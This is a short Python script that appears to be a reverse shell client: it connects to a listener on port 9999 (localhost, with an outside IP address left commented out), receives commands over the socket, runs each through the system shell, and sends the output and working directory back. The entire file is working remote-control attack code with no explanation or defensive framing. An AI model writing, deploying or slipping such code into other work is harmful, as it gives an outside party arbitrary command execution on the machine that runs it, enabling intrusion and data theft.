import socket
import os
import subprocess

s=socket.socket()
host="localhost"
#host="3.12.225.17"
port=9999
print("Connecting to Server ..")
s.connect((host,port))
"""msg=s.recv(1024).decode("utf-8")
print("\n")
print(msg)"""
while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        currentWD=os.getcwd()+">"
        s.send(str.encode(output_str+currentWD))
        print(output_str)
